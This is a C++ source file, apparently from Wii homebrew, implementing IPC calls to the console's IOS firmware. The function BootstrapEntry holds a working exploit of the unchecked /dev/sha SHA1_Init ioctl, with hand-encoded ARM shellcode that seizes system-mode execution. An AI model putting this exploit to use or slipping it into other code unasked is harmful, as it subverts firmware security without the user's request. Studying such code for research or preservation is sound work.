#include "IOS.hpp"
#include "Console.hpp"
#include "DCache.hpp"
#include <Boot/AddressMap.hpp>

template <typename T>
uintptr_t VirtualToPhysical(T* ptr)
{
    return reinterpret_cast<uintptr_t>(ptr) & 0x7fffffff;
}

template <typename T>
T* PhysicalToVirtual(uintptr_t addr)
{
    return reinterpret_cast<T*>(addr | 0x80000000);
}

namespace IOS
{

extern "C" volatile u32 ppcmsg;
extern "C" volatile u32 ppcctrl;
extern "C" volatile u32 armmsg;

extern "C" volatile u32 irqmask;

enum {
    X1 = 1 << 0,
    Y2 = 1 << 1,
    Y1 = 1 << 2,
    X2 = 1 << 3,
    IY1 = 1 << 4,
    IY2 = 1 << 5,
};

void Init()
{
    Shutdown();

    // while ((ppcctrl & Y2) != Y2); HACK for Dolphin
    ppcctrl = Y2;
    ppcctrl = Y1;
}

void Shutdown()
{
    for (s32 i = 0; i < 32; i++) {
        File file(i);
    }
}

bool IsDolphin()
{
    // Modern versions
    Resource dolphin("/dev/dolphin", Mode::None);
    if (dolphin.ok()) {
        return true;
    }

    // Old versions
    Resource sha("/dev/sha", Mode::None);
    if (!sha.ok()) {
        return true;
    }

    return false;
}

void SafeFlush(const void* start, size_t size)
{
    // The IPC function flushes the cache here on PPC, and then IOS invalidates
    // its own cache. Note: IOS doesn't check for the invalid fd before doing
    // what we want.
    File file(-1);
    file.write(start, size);
}

static u32 ReadMessage(u32 index)
{
    u32 address = IOS_BOOT_MSG_ADDRESS + index * 4;
    u32 message;
    asm volatile("lwz %0, 0x0 (%1); sync"
                 : "=r"(message)
                 : "b"(0xC0000000 | address));
    return message;
}

static void WriteMessage(u32 index, u32 message)
{
    u32 address = IOS_BOOT_MSG_ADDRESS + index * 4;
    asm volatile("stw %0, 0x0 (%1); eieio"
                 :
                 : "r"(message), "b"(0xC0000000 | address));
}

// Performs an IOS exploit and branches to the entrypoint in system mode.
//
// Exploit summary:
// - IOS does not check validation of vectors with length 0.
// - All memory regions mapped as readable are executable (ARMv5 has no 'no
// execute' flag).
// - NULL/0 points to the beginning of MEM1.
// - The /dev/sha resource manager, part of IOSC, runs in system mode.
// - It's obvious basically none of the code was audited at all.
//
// IOCTL 0 (SHA1_Init) writes to the context vector (1) without checking the
// length at all. Two of the 32-bit values it initializes are zero.
//
// Common approach: Point the context vector to the LR on the stack and then
// take control after return. A much more stable approach taken here: Overwrite
// the PC of the idle thread, which should always have its context start at
// 0xFFFE0000 in memory (across IOS versions).
bool BootstrapEntry()
{
    // Dolphin defaults to UID 0 for standalone binaries
    if (IsDolphin()) {
        return true;
    }

    WriteMessage(0, 0);

    Resource sha("/dev/sha", Mode::None);
    if (!sha.ok()) {
        return false;
    }

    u32* mem1 = reinterpret_cast<u32*>(0x80000000);
    mem1[0] = 0x4903468D; // ldr r1, =0x10100000; mov sp, r1;
    mem1[1] = 0x49034788; // ldr r1, =entrypoint; blx r1;
    // Overwrite reserved handler to loop infinitely
    mem1[2] = 0x49036209; // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
    mem1[3] = 0x47080000; // bx r1
    mem1[4] = 0x10100000; // temporary stack
    mem1[5] = IOS_BOOT_ADDRESS & 0x7FFFFFFF;
    mem1[6] = 0xFFFF0014; // reserved handler

    alignas(0x20) Resource::IoctlvPair pairs[4];
    pairs[0].data = nullptr;
    pairs[0].size = 0;
    pairs[1].data = reinterpret_cast<void*>(0xFFFE0028);
    pairs[1].size = 0;
    // Unused vector utilized for cache safety
    pairs[2].data = reinterpret_cast<void*>(0x80000000);
    pairs[2].size = 0x20;

    // IOS_Ioctlv should never return an error if the exploit succeeded
    if (sha.ioctlv(0, 1, 2, pairs) < 0) {
        return false;
    }

    while (ReadMessage(0) != 1) {
    }
    return true;
}

enum class Command : u32 {
    Open = 1,
    Close = 2,
    Read = 3,
    Write = 4,
    Seek = 5,
    Ioctl = 6,
    Ioctlv = 7,
};

struct Request {
    Command command;
    s32 result;
    s32 fd;

    union {
        struct {
            u32 path;
            Mode mode;
        } open;

        struct {
            u32 output;
            u32 outputSize;
        } read;

        struct {
            u32 input;
            u32 inputSize;
        } write;

        struct {
            u32 offset;
            u32 origin;
        } seek;

        struct {
            u32 ioctl;
            u32 input;
            u32 inputSize;
            u32 output;
            u32 outputSize;
        } ioctl;

        struct {
            u32 ioctlv;
            u32 inputCount;
            u32 outputCount;
            u32 pairs;
        } ioctlv;
    };

    u8 user[0x40 - 0x20];
};

static_assert(sizeof(Request) == 0x40);

alignas(0x20) static Request request;

static void Sync()
{
    DCache::Flush(request);

    ppcmsg = VirtualToPhysical(&request);
    ppcctrl = X1;

    while ((ppcctrl & Y2) != Y2) {
        if ((ppcctrl & Y1) == Y1) { // Expected an ack but got a reply!
            ppcctrl = Y1;
            ppcctrl = X2;
        }
    }
    ppcctrl = Y2;

    u32 reply;
    do {
        while ((ppcctrl & Y1) != Y1) {
            if ((ppcctrl & Y2) == Y2) { // Expected a reply but got an ack!
                ppcctrl = Y2;
            }
        }
        reply = armmsg;
        ppcctrl = Y1;

        ppcctrl = X2;
    } while (reply != VirtualToPhysical(&request));

    DCache::Invalidate(request);
}

Resource::Resource(s32 fd)
  : m_fd(fd)
{
}

Resource::Resource(const char* path, Mode mode)
{
    open(path, mode);
}

Resource::~Resource()
{
    if (m_fd >= 0) {
        close();
    }
}

s32 Resource::open(const char* path, Mode mode)
{
    DCache::Flush(path, strlen(path) + 1);

    request = {};
    request.command = Command::Open;
    request.open.path = VirtualToPhysical(path);
    request.open.mode = mode;

    Sync();

    m_fd = request.result;
    return request.result;
}

s32 Resource::close()
{
    request = {};
    request.command = Command::Close;
    request.fd = m_fd;

    Sync();

    m_fd = -1;
    return request.result;
}

s32 Resource::ioctl(
  u32 ioctl, const void* input, u32 inputSize, void* output, u32 outputSize)
{
    DCache::Flush(input, inputSize);
    DCache::Flush(output, outputSize);

    request = {};
    request.command = Command::Ioctl;
    request.fd = m_fd;
    request.ioctl.ioctl = ioctl;
    request.ioctl.input = VirtualToPhysical(input);
    request.ioctl.inputSize = inputSize;
    request.ioctl.output = VirtualToPhysical(output);
    request.ioctl.outputSize = outputSize;

    Sync();

    DCache::Invalidate(output, outputSize);

    return request.result;
}

s32 Resource::ioctlv(
  u32 ioctlv, u32 inputCount, u32 outputCount, IoctlvPair* pairs)
{
    for (u32 i = 0; i < inputCount + outputCount; i++) {
        if (pairs[i].data && pairs[i].size != 0) {
            DCache::Flush(pairs[i].data, pairs[i].size);
            pairs[i].data =
              reinterpret_cast<void*>(VirtualToPhysical(pairs[i].data));
        }
    }
    DCache::Flush(pairs, (inputCount + outputCount) * sizeof(IoctlvPair));

    request = {};
    request.command = Command::Ioctlv;
    request.fd = m_fd;
    request.ioctlv.ioctlv = ioctlv;
    request.ioctlv.inputCount = inputCount;
    request.ioctlv.outputCount = outputCount;
    request.ioctlv.pairs = VirtualToPhysical(pairs);

    Sync();

    for (u32 i = inputCount; i < inputCount + outputCount; i++) {
        if (pairs[i].data && pairs[i].size != 0) {
            pairs[i].data =
              PhysicalToVirtual<void*>(reinterpret_cast<u32>(pairs[i].data));
            DCache::Invalidate(pairs[i].data, pairs[i].size);
        }
    }

    return request.result;
}

bool Resource::ioctlvReboot(u32 ioctlv, u32 inputCount, IoctlvPair* pairs)
{
    for (u32 i = 0; i < inputCount; i++) {
        if (pairs[i].data && pairs[i].size != 0) {
            DCache::Flush(pairs[i].data, pairs[i].size);
            pairs[i].data =
              reinterpret_cast<void*>(VirtualToPhysical(pairs[i].data));
        }
    }
    DCache::Flush(pairs, inputCount * sizeof(IoctlvPair));

    request = {};
    request.command = Command::Ioctlv;
    request.fd = m_fd;
    request.ioctlv.ioctlv = ioctlv;
    request.ioctlv.inputCount = inputCount;
    request.ioctlv.outputCount = 0;
    request.ioctlv.pairs = VirtualToPhysical(pairs);

    DCache::Flush(request);

    ppcmsg = VirtualToPhysical(&request);
    ppcctrl = X1;

    while ((ppcctrl & Y2) != Y2) {
        if ((ppcctrl & Y1) == Y1) {
            u32 reply = armmsg;
            ppcctrl = Y1;
            if (reply == VirtualToPhysical(&request)) {
                return false;
            }
        }
    }
    ppcctrl = Y2;

    while ((ppcctrl & Y2) != Y2) {
        if ((ppcctrl & Y1) == Y1) {
            u32 reply = armmsg;
            ppcctrl = Y1;
            if (reply == VirtualToPhysical(&request)) {
                return false;
            }
        }
    }
    ppcctrl = Y2;
    ppcctrl = X2;

    return true;
}

bool Resource::ok() const
{
    return m_fd >= 0;
}

File::File(s32 fd)
  : Resource(fd)
{
}

File::File(const char* path, Mode mode)
  : Resource(path, mode)
{
}

File::~File() = default;

s32 File::read(void* output, u32 outputSize)
{
    request = {};
    request.command = Command::Read;
    request.fd = m_fd;
    request.read.output = VirtualToPhysical(output);
    request.read.outputSize = outputSize;

    Sync();

    DCache::Invalidate(output, outputSize);
    return request.result;
}

s32 File::write(const void* input, u32 inputSize)
{
    DCache::Flush(input, inputSize);

    request = {};
    request.command = Command::Write;
    request.fd = m_fd;
    request.write.input = VirtualToPhysical(input);
    request.write.inputSize = inputSize;

    Sync();

    return request.result;
}

s32 File::seek(u32 offset, u32 origin)
{
    request = {};
    request.command = Command::Seek;
    request.fd = m_fd;
    request.seek.offset = offset;
    request.seek.origin = origin;

    Sync();

    return request.result;
}

s32 File::getStats(Stats* stats)
{
    alignas(0x20) Stats out;

    s32 result = ioctl(Ioctl::GetFileStats, nullptr, 0, &out, sizeof(out));
    if (result >= 0) {
        *stats = out;
    }
    return result;
}

} // namespace IOS
